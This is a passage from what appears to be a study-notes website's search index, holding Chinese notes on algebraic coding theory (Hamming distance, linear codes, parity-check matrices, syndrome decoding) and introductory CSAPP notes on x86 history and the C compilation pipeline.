\u4f4d\u7f16\u4e3a\u4e00\u4e2a\u5355\u4f4d\uff0c\u7136\u540e\u6bcf\u4e2a\u5355\u4f4d\u5206\u522b\u7f16\u7801\u4e3a \\(n\\) \u4f4d\u3001\u4ece \\(n\\) \u4f4d\u89e3\u7801\uff0c\u6709\u8fd9\u79cd\u7279\u70b9\u7684\u4e32\u79f0\u4e3a \\((n,m)\\) \u5757\u7801\u3002</p> <p>\u7f16\u7801\u51fd\u6570\u3001\u89e3\u7801\u51fd\u6570\uff1a\u6211\u4eec\u5bf9\u4e8e\u957f\u5ea6\u4e3a \\(m\\) \u7684\u4e8c\u8fdb\u5236\u4e32\uff0c\u5176\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a \\(n\\) \u7684\u4e8c\u8fdb\u5236\u4e32\u7684\u5355\u5c04\uff0c\u7528\u8fd9\u79cd\u8fd9\u6837\u7f16\u7801\u7684\u51fd\u6570\u79f0\u4e3a\u7f16\u7801\u51fd\u6570\uff0c\u4e5f\u5c31\u6709\uff1a\\(E:\\mathbb{Z}_2^m\\to \\mathbb{Z}_2^n\\)\uff0c\u7c7b\u4f3c\u5730\u7528\u4e8e\u89e3\u7801\u7684\u5355\u5c04\u51fd\u6570\u79f0\u4e3a\u89e3\u7801\u51fd\u6570\uff1a\\(D:\\mathbb{Z}_2^n\\to \\mathbb{Z}_2^m\\).</p> <p>\u4e00\u4e2a\u7801\u5b57\uff08codeword\uff09\u662f \\(E\\) \u7684\u50cf\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\u5143\u7d20\u3002</p> <p>\u6c49\u660e\u8ddd\u79bb\uff08Hamming distance\uff09\uff1a\u4e24\u4e2a\u4e32\u7684 Hamming \u8ddd\u79bb\u4e3a\u5176\u6700\u5c11\u9700\u8981\u4fee\u6539\u591a\u5c11\u4f4d\uff0c\u4f7f\u5f97\u4ece\u4e00\u4e2a\u4e32\u53d8\u4e3a\u53e6\u4e00\u4e2a\u4e32\uff0c\u5728\u4e8c\u8fdb\u5236\u4e32\u7684\u60c5\u51b5\u4e0b\uff0c\u4e3a\u4e8c\u8005\u5f02\u6216\u7684 1 \u7684\u4e2a\u6570\uff0c\u8bb0\u4f5c \\(d(\\mathbf{x},\\mathbf{y})\\).</p> <p>\u6700\u5c0f\u8ddd\u79bb\uff08minimum distance\uff09\uff1a\u4efb\u610f\u4e24\u4e2a\u7801\u5b57\u7684 Hamming \u8ddd\u79bb\u7684\u6700\u5c0f\u503c\uff0c\u8bb0\u4f5c \\(d_\\min\\).</p> <p>\u91cd\u91cf\uff08weight\uff09\uff1a\u4e32\u4e2d 1 \u7684\u4e2a\u6570\uff0c\u8bb0\u4f5c \\(w(\\mathbf{x})\\).</p> <p>Prop. 8.11\uff1a\u5047\u8bbe \\(\\mathbf{x},\\mathbf{y},\\mathbf{z}\\) \u90fd\u4e3a \\(n\\) \u4f4d\u4e8c\u8fdb\u5236\u4e32\uff0c\u90a3\u4e48\uff1a</p> <ol> <li>\\(w(\\mathbf{x})=d(\\mathbf{x},\\mathbf{0})\\).</li> <li>\\(d(\\mathbf{x},\\mathbf{y})\\ge 0\\).</li> <li>\\(d(\\mathbf{x},\\mathbf{y})=0\\text{ iff. } \\mathbf{x}=\\mathbf{y}\\).</li> <li>\\(d(\\mathbf{x},\\mathbf{y})=d(\\mathbf{y},\\mathbf{x})\\).</li> <li>\\(d(\\mathbf{x},\\mathbf{y})\\le d(\\mathbf{x},\\mathbf{z})+d(\\mathbf{z},\\mathbf{y})\\).</li> </ol> <p>Th. 8.13 \u8bbe\u7801\u5b57\u96c6\u5408\u4e3a \\(C\\)\uff0c\u4e14\u6700\u5c0f\u8ddd\u79bb \\(d_\\min=2n+1\\)\uff0c\u90a3\u4e48\u4efb\u4f55\u4e0d\u8d85\u8fc7 \\(n\\) \u4f4d\u9519\u8bef\u90fd\u53ef\u4ee5\u88ab\u7ea0\u6b63\uff0c\u4efb\u4f55 \\(2n\\) \u4f4d\u9519\u8bef\u90fd\u53ef\u88ab\u63a2\u6d4b\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/Theory/L016_%E4%BB%A3%E6%95%B0%E7%BC%96%E7%A0%81/#linear-codes","title":"\u7ebf\u6027\u7f16\u7801 Linear Codes","text":"<p>\u7fa4\u7801\uff08group code\uff09\u662f \\(\\mathbb{Z}_2^n\\) \u7684\u5b50\u7fa4\u7684\u7801\u5b57\u96c6\u5408\u3002</p> <p>Lem. 8.17 \u8bbe \\(\\mathbf{x}\\) \u548c \\(\\mathbf{y}\\) \u90fd\u662f \\(n\\) \u4f4d\u4e8c\u8fdb\u5236\u4e32\uff0c\u90a3\u4e48 \\(w(\\mathbf{x}+\\mathbf{y})=d(\\mathbf{x},\\mathbf{y})\\). \u6ce8\u610f\uff0c\u6b64\u5904\u7684 \\(+\\) \u5e94\u5f53\u662f\u4e8c\u8fdb\u5236\u4e32\u7684\u5f02\u6216\u3002</p> <p>Lem. 8.18 \u8bbe\u7fa4\u7801 \\(C\\) \u7684\u6700\u5c0f\u8ddd\u79bb\u662f \\(d_\\min\\)\uff0c\u90a3\u4e48 \\(d_\\min=\\min\\{w(\\mathbf{x})|\\mathbf{x}\\ne\\mathbf{0}\\}\\).</p> <p>\u5185\u79ef\uff08inner product\uff09\uff1a\\(\\mathbf{x}\\cdot\\mathbf{y}=x_1y_1+\\cdots+x_ny_n\\). \u6ce8\u610f\uff0c\u6b64\u5904\u7684\u6309\u4f4d\u4e58\u6cd5\u5e94\u89c6\u4f5c\u6309\u4f4d\u4e0e\u3002</p> <p>\u96f6\u7a7a\u95f4\uff1a\u8bbe \\(\\mathbb{M}_{m\\times n}(\\mathbb{Z}_2)\\) \u4e3a \\(\\mathbb{Z}_2\\) \u5143\u7d20\u53ca\u8fd0\u7b97\u6784\u6210\u7684\u6240\u6709 \\(m\\times n\\) \u77e9\u9635\u7684\u96c6\u5408\uff0c\u5bf9\u4e8e \\(H\\in \\mathbb{M}_{m\\times n}(\\mathbb{Z}_2)\\)\uff0c\u5176\u96f6\u7a7a\u95f4 \\(\\mathrm{Null}(H)\\) \u4e3a\u8fd9\u6837\u7684 \\(\\mathbf{x}\\) \u7684\u96c6\u5408\uff1a\\(H\\mathbf{x}=\\mathbf{0}\\).</p> <p>Th. 8.21 \u5bf9\u4e8e \\(H\\in \\mathbb{M}_{m\\times n}(\\mathbb{Z}_2)\\)\uff0c\u5176\u96f6\u7a7a\u95f4 \\(\\mathrm{Null}(H)\\) \u4e3a\u4e00\u4e2a\u7fa4\u7801\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u7801\u4e3a\u67d0\u4e2a \\(H\\) \u7684\u96f6\u7a7a\u95f4\uff0c\u90a3\u4e48\u79f0\u8be5\u7801\u4e3a\u4e00\u4e2a\u7ebf\u6027\u7f16\u7801\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/Theory/L016_%E4%BB%A3%E6%95%B0%E7%BC%96%E7%A0%81/#parity-check-and-generator-matrices","title":"\u5947\u5076\u6821\u9a8c\u77e9\u9635\u548c\u751f\u6210\u77e9\u9635 Parity-Check and Generator Matrices","text":"<p>\u89c4\u8303\u7684\u5947\u5076\u6821\u9a8c\u77e9\u9635\uff08canonical parity-check matrix\uff09\uff1a\u8bbe \\(H\\in \\mathbb{M}_{m\\times n}(\\mathbb{Z}_2)\\)\uff0c\u5982\u679c \\(H=(A,I_m)\\)\uff0c\u90a3\u4e48 \\(H\\) \u79f0\u4e3a\u89c4\u8303\u7684\u5947\u5076\u6821\u9a8c\u77e9\u9635\u3002</p> <p>\u6807\u51c6\u7684\u751f\u6210\u77e9\u9635\uff08standard generator matrix\uff09\uff1a\u4e0e\u89c4\u8303\u7684\u5947\u5076\u6821\u9a8c\u77e9\u9635\u5bf9\u5e94\uff0c\\(G=(I_{n-m};A)\\) \u8fd9\u4e2a \\(n\\times (n-m)\\) \u77e9\u9635\u79f0\u4e3a\u5176\u6807\u51c6\u7684\u751f\u6210\u77e9\u9635\u3002</p> <p>\u8fd9\u6837\u5b9a\u4e49\u662f\u56e0\u4e3a\uff1a\u5982\u679c \\(G\\mathbf{x}=\\mathbf{y}\\) \u6210\u7acb\uff0c\u5f53\u4e14\u4ec5\u5f53 \\(H\\mathbf{y}=\\mathbf{0}\\) \u6210\u7acb\u3002</p> <p>Th. 8.25 \u5982\u679c \\(H\\in \\mathbb{M}_{m\\times n}(\\mathbb{Z}_2)\\) \u662f\u4e00\u4e2a\u89c4\u8303\u7684\u5947\u5076\u6821\u9a8c\u77e9\u9635\uff0c\u90a3\u4e48 \\(\\mathrm{Null}(H)\\) \u5c31\u6709\u6240\u6709\u8fd9\u6837\u7684 \\(\\mathrm{x}\\in\\mathbb{Z}_2^n\\) \u7ec4\u6210\uff1a\u524d \\(n-m\\) \u4f4d\u4efb\u610f\uff0c\u800c\u540e \\(m\\) \u4f4d\u7531\u524d \\(n-m\\) \u4f4d\u548c \\(H\\mathbf{x}=\\mathbf{0}\\) \u51b3\u5b9a\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u8fd9\u6837\u7406\u89e3\uff1a\u6700\u540e\u7684 \\(m\\) \u4f4d\u5b9e\u9645\u4e0a\u662f\u5bf9\u524d \\(n-m\\) \u4f4d\u7684\u5947\u5076\u6821\u9a8c\uff0c\u4e5f\u5c31\u662f\u8bf4 \\(H\\) \u7ed9\u51fa\u4e86\u4e00\u4e2a \\((n,n-m)\\) \u5757\u7801\u3002\u8fdb\u4e00\u6b65\u5730\uff0c\u6211\u4eec\u79f0 \\(\\mathbf{x}\\) \u7684\u524d \\(n-m\\) \u4f4d\u4e3a\u4fe1\u606f\u4f4d\uff08information bits\uff09\uff0c\u540e \\(m\\) \u4f4d\u79f0\u4e3a\u6821\u9a8c\u4f4d\uff08check bits\uff09\u3002</p> <p>Th. 8.26 \u8bbe \\(G\\) \u4f4d\u4e00\u4e2a \\(n\\times k\\) \u7684\u6807\u51c6\u7684\u751f\u6210\u77e9\u9635\uff0c\u90a3\u4e48 \\(C=\\{\\mathbf{y}|G\\mathbf{x}=\\mathbf{y},\\mathbf{x}\\in\\mathbb{Z}_2^k\\}\\) \u662f\u4e00\u4e2a \\((n,k)\\) \u5757\u7801\uff0c\u8fdb\u4e00\u6b65\u5730\uff0c\\(C\\) \u4e5f\u662f\u4e00\u4e2a\u7fa4\u7801\u3002</p> <p>Lem. 8.27 \u8bbe \\(H=(A,I_m)\\) \u662f\u4e00\u4e2a \\(m\\times n\\) \u7684\u89c4\u8303\u7684\u5947\u5076\u6821\u9a8c\u77e9\u9635\uff0c\u5e76\u4e14 \\(G=(I_{n-m};A)\\) \u662f\u5bf9\u5e94\u7684 \\(n\\times (n-m)\\) \u7684\u6807\u51c6\u7684\u751f\u6210\u77e9\u9635\uff0c\u90a3\u4e48\u6211\u4eec\u6709 \\(HG=O_{m\\times (n-m)}\\).</p> <p>Th. 8.28 \u8bbe \\(H=(A,I_m)\\) \u662f\u4e00\u4e2a \\(m\\times n\\) \u7684\u89c4\u8303\u7684\u5947\u5076\u6821\u9a8c\u77e9\u9635\uff0c\u5e76\u4e14 \\(G=(I_{n-m};A)\\) \u662f\u5bf9\u5e94\u7684 \\(n\\times (n-m)\\) \u7684\u6807\u51c6\u7684\u751f\u6210\u77e9\u9635\u3002\u8bbe \\(C\\) \u4e3a \\(G\\) \u751f\u6210\u7684\u7fa4\u7801\uff0c\u90a3\u4e48 \\(\\mathbf{y}\\in C \\text{ iff. }H\\mathbf{y}=\\mathbf{0}\\)\uff0c\u8fdb\u4e00\u6b65\u5730\uff0c\\(C\\) \u662f\u4e00\u4e2a\u6709\u89c4\u8303\u7684\u5947\u5076\u6821\u9a8c\u77e9\u9635 \\(H\\) \u7684\u7fa4\u7801\u3002</p> <p>Prop. 8.30 \u8bbe \\(\\mathbf{e}_i\\) \u4e3a\u53ea\u6709\u7b2c \\(i\\) \u4f4d\u4e3a 1\uff0c\u5176\u4f59\u4e3a\u5168 0 \u7684\u957f\u5ea6\u4e3a \\(n\\) \u7684\u4e32\uff0c\u5e76\u5047\u8bbe \\(H\\in \\mathbb{M}_{m\\times n}(\\mathbb{Z}_2)\\)\uff0c\u90a3\u4e48 \\(H\\mathbf{e}_i\\) \u5c31\u662f \\(H\\) \u7684\u7b2c \\(i\\) \u5217\u3002</p> <p>Th. 8.31 \u8bbe \\(H\\in \\mathbb{M}_{m\\times n}(\\mathbb{Z}_2)\\)\uff0c\u90a3\u4e48 \\(\\mathrm{Null}(H)\\) \u662f\u4e00\u4e2a\u4e00\u4f4d\u9519\u8bef\u53ef\u68c0\u6d4b\u7684\u7801\u5f53\u4e14\u4ec5\u5f53 \\(H\\) \u4e2d\u4e0d\u5b58\u5728\u5168 0 \u5217\u3002</p> <p>Th. 8.34 \u8bbe \\(H\\in \\mathbb{M}_{m\\times n}(\\mathbb{Z}_2)\\)\uff0c\u90a3\u4e48 \\(\\mathrm{Null}(H)\\) \u662f\u4e00\u4e2a\u4e00\u4f4d\u9519\u8bef\u53ef\u68c0\u6d4b\u7684\u7801\u5f53\u4e14\u4ec5\u5f53 \\(H\\) \u4e2d\u4e0d\u5b58\u5728\u5168 0 \u5217\u6216\u76f8\u7b49\u5217\u3002</p> <p>\u56e0\u76f8\u5173\u9650\u5236\uff0c\u5bf9\u4e8e \\(n=2^m\\)\uff0c\u4fe1\u606f\u4f4d\u6700\u591a\u6709 \\(n-(1+m)\\) \u4f4d\uff0c\u5176\u4e2d\u4e00\u5217\u96f6\u5217\uff0c\\(m\\) \u5217 \\(\\mathrm{e}_i\\)\uff0c\u4ece\u800c\u6700\u5927\u53ef\u80fd\u7684\u7f16\u7801\u7387\u4e3a\uff1a\\((n-1-m)/n=1-\\dfrac{1+m}{2^m}\\).\uff08P141\uff09</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/Theory/L016_%E4%BB%A3%E6%95%B0%E7%BC%96%E7%A0%81/#efficient-decoding","title":"\u9ad8\u6548\u89e3\u7801 Efficient Decoding","text":"<p>\u5982\u679c \\(H\\in \\mathbb{M}_{m\\times n}(\\mathbb{Z}_2)\\) \u4e14 \\(\\mathbf{x}\\in\\mathbb{Z}_2^n\\)\uff0c\u90a3\u4e48\u79f0 \\(H\\mathbf{x}\\) \u4e3a \\(\\mathbf{x}\\) \u7684\u6821\u9a8c\u5b50\uff08syndrome\uff09\uff0c\u4ee5\u4e0b\u65b9\u6cd5\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5feb\u901f\u89e3\u7801\u548c\u7ea0\u6b63\u9519\u8bef\u3002</p> <p>Prop. 8.36 \u8bbe \\(H\\in \\mathbb{M}_{m\\times n}(\\mathbb{Z}_2)\\) \u5176\u51b3\u5b9a\u4e86\u4e00\u4e2a\u7ebf\u6027\u7801\uff0c\\(\\mathbf{x}\\) \u662f\u4e00\u4e2a\u63a5\u6536\u5230\u7684 \\(n\\) \u4f4d\u4e32\uff0c\u5e76\u8bbe \\(\\mathbf{x}=\\mathbf{c}+\\mathbf{e}\\)\uff0c\u5176\u4e2d \\(\\mathbf{c}\\) \u4e3a\u53d1\u9001\u4fe1\u606f\uff0c\\(\\mathbf{e}\\) \u4e3a\u566a\u58f0\uff0c\u90a3\u4e48 \\(\\mathbf{x}\\) \u7684\u6821\u9a8c\u5b50\u7b49\u4e8e \\(\\mathbf{e}\\) \u7684\u6821\u9a8c\u5b50\u3002</p> <p>Th. 8.37 \u8bbe \\(H\\in \\mathbb{M}_{m\\times n}(\\mathbb{Z}_2)\\) \u4e14\u5176\u51b3\u5b9a\u7684\u7ebf\u6027\u662f\u4e00\u4f4d\u9519\u8bef\u53ef\u7ea0\u6b63\u7684\u3002\u8bbe \\(\\mathbf{r}\\) \u4e3a\u4e00\u4e2a\u63a5\u6536\u5230\u7684 \\(n\\) \u4f4d\u4e32\uff0c\u5176\u81f3\u591a\u53ea\u6709\u4e00\u4f4d\u9519\u8bef\uff0c\u90a3\u4e48\uff1a\u5982\u679c \\(\\mathbf{r}\\) \u7684\u6821\u9a8c\u5b50\u4e3a \\(\\mathbf{0}\\)\uff0c\u90a3\u4e48\u4e0d\u5b58\u5728\u9519\u8bef\uff1b\u5426\u5219\uff0c\u67e5\u627e \\(\\mathbf{r}\\) \u7684\u6821\u9a8c\u5b50\u662f \\(H\\) \u7684\u90a3\u4e00\u5217\uff0c\u5047\u8bbe\u662f\u7b2c \\(i\\) \u5217\uff0c\u90a3\u4e48\u4e00\u4f4d\u9519\u8bef\u5c31\u5728\u7b2c \\(i\\) \u4f4d\u3002</p> <p>\u966a\u96c6\u89e3\u7801\u3001\u6807\u51c6\u89e3\u7801\uff08coset decoding, standard decoding\uff09\uff1a\u5176\u4f7f\u7528 \\(C\\) \u7684\u966a\u96c6\u6765\u5b9e\u73b0\u6700\u5927\u4f3c\u7136\u89e3\u7801\uff0c\u8bbe \\(C\\) \u662f\u4e00\u4e2a \\((n,m)\\) \u7ebf\u6027\u7801\uff0c\u90a3\u4e48\u4e00\u4e2a \\(C\\) \u5bf9\u4e8e \\(\\mathbf{x}\\in\\mathbb{Z}_2^n\\) \u7684\u966a\u96c6\u53ef\u4ee5\u5199\u4f5c \\(\\mathbf{x}+C\\)\uff0c\u901a\u8fc7 Lagrange \u5b9a\u7406\uff08\u7fa4\u8bba\uff09\uff0c\\(C\\) \u603b\u5171\u6709 \\(2^{n-m}\\) \u4e2a\u4e0d\u540c\u7684\u966a\u96c6\u3002</p> <p>\u966a\u96c6\u4ee3\u8868\uff08coset leader\uff09\uff1a\u966a\u96c6\u4e2d\u91cd\u91cf\u6700\u5c0f\u7684 \\(n\\) \u4f4d\u4e32\u79f0\u4e3a\u8fd9\u4e2a\u966a\u96c6\u7684\u966a\u96c6\u4ee3\u8868\u3002</p> <p>\u89e3\u7801\u8868\uff08decoding table\uff09\uff1a\u56e0 Prop. 8.43\uff0c\u4e00\u4e2a\u6821\u9a8c\u5b50\u5bf9\u5e94\u4e00\u4e2a\u966a\u96c6\uff0c\u5c06\u5176\u5217\u51fa\u4e00\u5f20\u8868\uff0c\u79f0\u4e3a\u89e3\u7801\u8868\u3002</p> <p>Prop. 8.43 \u8bbe \\(C\\) \u662f\u4e00\u4e2a \\((n,k)\\) \u7ebf\u6027\u7801\uff0c\u5176\u7531 \\(H\\) \u7ed9\u5b9a\uff0c\u5e76\u4e14\u5047\u8bbe \\(\\mathbf{x},\\mathbf{y}\\in \\mathbb{Z}_2^n\\)\uff0c\u90a3\u4e48 \\(\\mathbf{x}\\) \u548c \\(\\mathbf{y}\\) \u6709\u76f8\u540c\u7684\u966a\u96c6\u5f53\u4e14\u4ec5\u5f53 \\(H\\mathbf{x}=H\\mathbf{y}\\) \uff0c\u4e5f\u5c31\u662f\u8bf4\u4e24\u4e2a\u4e32\u7684\u966a\u96c6\u76f8\u540c\u5f53\u4e14\u4ec5\u5f53\u5176\u6821\u9a8c\u5b50\u76f8\u540c\u3002</p> <p>\u663e\u7136\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u89e3\u7801\u65b9\u6cd5\uff1a\u5bf9\u4e8e\u5b58\u5728\u9519\u8bef\u7684\u4e32\uff0c\u53d6\u5176\u6821\u9a8c\u5b50\u5bf9\u5e94\u7684\u966a\u96c6\u7684\u966a\u96c6\u4ee3\u8868\u4f5c\u4e3a\u9519\u8bef\uff0c\u7531\u6b64\u7b97\u51fa\u539f\u53d1\u9001\u4fe1\u606f\u3002\u8fd9\u4e00\u65b9\u6cd5\u7531\u6700\u5927\u4f3c\u7136\u89e3\u7801\u539f\u5219\u7ed9\u51fa\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/CSAPPreadme/","title":"CSAPPreadme","text":"<p>\u672c\u95e8\u8bfe\u7a0b\u7684\u6f14\u793a\u90fd\u662f\u57fa\u4e8e x86-64 + Linux \u7684\uff0c\u4e5f\u5c31\u662f AMD64 + Linux \u7684\u3002</p> <p>\u53e6\u51e0\u79cd\u5e38\u89c1\u7684\u662f\u91c7\u7528 RISC \u6216 x86 \u800c\u975e AMD64\uff0c\u6216\u662f Intel/Microsoft \u4e0a\u7684\u800c\u975e Linux \u4e0a\u7684\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L05-Machine-Level-Programming-I-Basics/","title":"L05 Machine-Level Programming I: Basics","text":"<p>source: https://www.bilibili.com/video/BV1iW411d7hd?p=5</p> <p>machine-level programming\uff1a\u6307\u673a\u5668\u7801/\u76ee\u6807\u4ee3\u7801\uff08object code\uff09\u6216\u8005\u6c47\u7f16\u4ee3\u7801\uff08assembly code\uff09\uff0c\u4e8c\u8005\u4e00\u4e00\u5bf9\u5e94\u3002</p> <p>Four Parts:</p> <ol> <li>History of Intel processors and architectures</li> <li>C, assembly, machine code </li> <li>Assembly Basics: Register, operands, move</li> <li>Arithmetic &amp; logic operations</li> </ol> <p>\u8bf7\u6ce8\u610f\uff01\u672c\u8bfe\u7a0b\u7684\u5f55\u64ad\u662f 2015 \u5e74\u7684\uff0c\u5341\u5e74\u5230\u73b0\u5728\u5f88\u591a\u524d\u6cbf\u6280\u672f\u5df2\u7ecf\u6709\u4e86\u5de8\u5927\u53d1\u5c55\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L05-Machine-Level-Programming-I-Basics/#part-1","title":"Part 1","text":"<p>Intel x86 processors\uff08Intel x86 \u5904\u7406\u5668\uff09\uff0c\u56e0\u5904\u7406\u5668\u7cfb\u5217\u5404\u5904\u7406\u5668\u4ee3\u53f7\u4e3a 8086\u30018236\u30018386 \u7b49\u4ee5 86 \u7ed3\u5c3e\u6240\u4ee5\u79f0\u4e3a x86</p> <p>x86 \u6709\u65f6\u4e5f\u79f0\u4e3a CISC\uff0c1980s RISC \u548c CISC \u5e76\u5b58\u3002Intel \u4f7f\u7528\u7ecf\u5178\u7684 CISC \u67b6\u6784\u3002</p> <p>\u57281985 \u5e74\uff0cIntel 32 \u4f4d\u67b6\u6784\uff0c\u6709\u65f6\u4e5f\u79f0\u4e3a IA32 \u51e0\u4e4e\u7edf\u6cbb\u4e86\u6240\u6709\u7684\u4ee3\u7801\u5f62\u5f0f\u3002</p> <p>2004 \u5e74\u5236\u9020\u7684\u5904\u7406\u5668\u53d1\u73b0\u53d1\u70ed\u8fc7\u4e8e\u4e25\u91cd\uff0c\u6240\u4ee5 Intel \u63a7\u5236\u4e86\u9891\u7387\uff0c\u5e76\u4ece\u5355\u6838\u8f6c\u5411\u591a\u6838\uff0c\u5176\u5171\u4eab\u4e00\u4e2a\u7f13\u5b58\u3002</p> <p>Intel \u5e76\u4e0d\u662f\u552f\u4e00\u73a9\u5bb6\uff0c\u5b83\u6709\u7ade\u4e89\u5bf9\u624b AMD\uff08Advanced Micro Devices\uff09\uff0c\u603b\u662f\u843d\u4e8e Intel \u4e4b\u4e0b\u3002\u30102019 \u5e74 AMD \u4e00\u5ea6\u88ab\u8ba4\u4e3a\u662f\u7b2c\u4e00\uff0c\u672a\u6765\u4e5f\u6709\u66f4\u4e30\u5bcc\u7684\u53d8\u5316\u3011Intel \u548c AMD \u4e24\u5bb6\u56e0\u8fc7\u53bb\u7684\u4e13\u5229\u7ea0\u7eb7\u548c\u5bf9\u5bf9\u65b9\u7684\u9488\u5bf9\u6027\uff0c\u4ea7\u54c1\u6709\u76f8\u4f3c\u4e5f\u6709\u5dee\u5f02\uff0c\u8fd9\u662f\u4e0b\u6587 AMD64 \u57fa\u4e8e Intel x86 \u7cfb\u5217\u88ab\u521b\u9020\u51fa\u6765\u7684\u57fa\u7840\u3002\uff08\u4ea4\u53c9\u8bb8\u53ef\u534f\u8bae\uff09</p> <p>2001 \u5e74 Intel \u5c1d\u8bd5\u4ece IA32 \u8f6c\u5411 IA64\uff0c\u4f46\u7ed3\u679c\u662f\u5931\u8d25\uff0c\u5728\u5e02\u573a\u4e0a\u4e25\u91cd\u53d7\u632b\u3002</p> <p>2003 \u5e74 AMD \u6269\u5927\u4e86\u5bc4\u5b58\u5668\uff0c\u63a8\u51fa\u7684\u4ea7\u54c1\u53d6\u5f97\u4e86\u6210\u529f\uff0c\u5f97\u5230\u4e86 x86-64\uff0c\u73b0\u5728\u88ab\u79f0\u4f5c AMD64. </p> <p>\u6574\u7406\uff1aIA32 \u5c31\u662f\u4f20\u7edf\u7684 x86\uff0c\u4e4b\u540e\u7684\u662f AMD64\uff0c\u4e5f\u79f0\u4f5c x86-64.</p> <p>\u76ee\u524d\u5e38\u7528\u7684\u53e6\u4e00\u5927\u5904\u7406\u5668\u662f ARM\uff08Acorn RISC Machine\uff09\uff0c\u7531 Acorn \u516c\u53f8\u72ec\u7acb\u4e8e Intel \u81ea\u4e3b\u7814\u53d1\uff0cAcorn \u516c\u53f8\u8bbe\u8ba1\u4e86\u66f4\u52a0\u7cbe\u7b80\u7684\u6307\u4ee4\u96c6\uff0c\u4e4b\u540e\u88ab\u6536\u8d2d\u6765\u6536\u8d2d\u53bb\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L05-Machine-Level-Programming-I-Basics/#part-2","title":"Part 2","text":"<p>\u6307\u4ee4\uff08instruction\uff09\u3001\u6307\u4ee4\u96c6\uff08instruction set\uff09\u3001\u6307\u4ee4\u96c6\u67b6\u6784\uff08ISA, instruction set architecture\uff09</p> <p>\u8fd9\u4e2a\u62bd\u8c61\u4e4b\u4e0b\u4e3b\u8981\u662f\u5177\u4f53\u786c\u4ef6\u5b9e\u73b0\uff0c\u79f0\u4e3a\u5fae\u67b6\u6784\uff08microarchitecture\uff09</p> <p>\u6307\u4ee4\u5f62\u5f0f\uff1a\u673a\u5668\u7801\uff08machine code\uff09\u548c\u6c47\u7f16\u4ee3\u7801\uff08assembly code\uff09</p> <p>\u51e0\u79cd ISA\uff1ax86\u3001IA32\u3001Itanium\u3001x86-64</p> <p>\u7a0b\u5e8f\u8ba1\u6570\u5668\uff08PC, program counter\uff09</p> <p>\u5bc4\u5b58\u5668\uff08\u5806\uff09\uff08register file\uff09</p> <p>\u72b6\u6001\u7801\uff08condition code\uff09\u5b58\u50a8\u6700\u8fd1\u8ba1\u7b97\u7684\u7ed3\u679c\u7684\u4e00\u4e9b\u989d\u5916\u4fe1\u606f\uff0c\u5176\u548c\u6761\u4ef6\u3001\u8df3\u8f6c\u6307\u4ee4\u76f8\u5173</p> <p>\u5185\u5b58\uff08memory\uff09</p> <p>\u5b9e\u9645\u4e0a\uff0c\u64cd\u4f5c\u7cfb\u7edf\u548c\u786c\u4ef6\u4e4b\u95f4\u5b58\u5728\u4e00\u79cd\u534f\u4f5c\uff0c\u521b\u9020\u4e86\u300c\u865a\u62df\u5185\u5b58\u300d\u8fd9\u6837\u7684\u4e1c\u897f\uff0c\u4f7f\u5f97\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u7684\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u770b\u8d77\u6765\u50cf\u62e5\u6709\u81ea\u5df1\u72ec\u7acb\u7684\u5b57\u8282\u6570\u7ec4\u4e00\u6837\uff0c\u5b9e\u9645\u4e0a\u6700\u7ec8\u90fd\u5b58\u50a8\u5728\u8fd9\u4e00\u5757\u5185\u5b58\u4e0a\u3002</p> <p>\u7f13\u5b58\uff08cache\uff09\uff0c\u4f60\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u7f13\u5b58\u3002</p> <p>C \u8bed\u8a00\u7a0b\u5e8f\u8f6c\u6362\u4e3a\u673a\u5668\u7801\uff1a</p> <p>text -- compiler -&gt; text -- assembler -&gt; binary -- linker -&gt; binary </p> <p>\u7b2c\u4e00\u6b65\uff1a\u4f7f\u7528\u7f16\u8bd1\u5668\uff08compiler\uff09\u8f6c\u4e3a\u6c47\u7f16\u4ee3\u7801\uff1b\u7b2c\u4e8c\u6b65\uff0c\u4f7f\u7528\u6c47\u7f16\u5668\uff08\u6c47\u7f16\u7f16\u8bd1\u5668\uff0cassembler\uff09\u5c06\u5176\u8f6c\u6362\u4e3a\u5b9e\u9645\u7684\u5b57\u8282\u5f62\u5f0f\uff1b\u7b2c\u4e09\u6b65\uff0c\u4f7f\u7528\u94fe\u63a5\u5668\uff08linker\uff09\u5c06\u5404\u6587\u4ef6\u7684\u673a\u5668\u7801\u878d\u5408\u5728\u4e00\u8d77\u4ea4\u7ed9\u4e2d\u592e\u5904\u7406\u5668\u5904\u7406\u3002</p> <p>\u5e93\u5bfc\u5165\u4e00\u90e8\u5206\u5728 compiler \u65f6\u52a8\u6001\u5bfc\u5165\uff0c\u4e00\u90e8\u5206\u5728 linker \u65f6\u5bfc\u5165\u3002</p> <p>examples</p> <pre><code>$ gcc -Og -S sum.c \n</code></pre> <p>\u5176\u4e2d <code>-Og</code> \u8868\u793a\u4f18\u5316\u8c03\u8bd5\u4f53\u9a8c\uff0c\u7f16\u8bd1\u5668\u6309\u8c03\u8bd5\u65b9\u4fbf\u5408\u7406\u4f18\u5316\uff08\u5373\u8d34\u8fd1\u6e90\u4ee3\u7801\uff09\uff0c\u4e00\u822c\u662f\u7981\u7528\u4e86\u8bb8\u591a\u4f18\u5316\u65b9\u5f0f\uff0c<code>-S</code> \u8868\u793a\u53ea\u5c06\u6e90\u6587\u4ef6\u7f16\u8bd1\u6210\u6c47\u7f16\u4ee3\u7801\uff0c\u4e0d\u8fdb\u884c\u6c47\u7f16\u548c\u94fe\u63a5\u3002\u5f97\u5230\u7684\u7ed3\u679c\u5e94\u8be5\u662f <code>.s</code> \u6587\u4ef6\u3002</p> <p>crud\uff0cCRUD\uff0ccreate, retrieve, update &amp; drop\uff0c\u589e\u5220\u6539\u67e5\uff08\u589e\uff0c\u67e5\uff0c\u6539\uff0c\u5220\uff09</p> 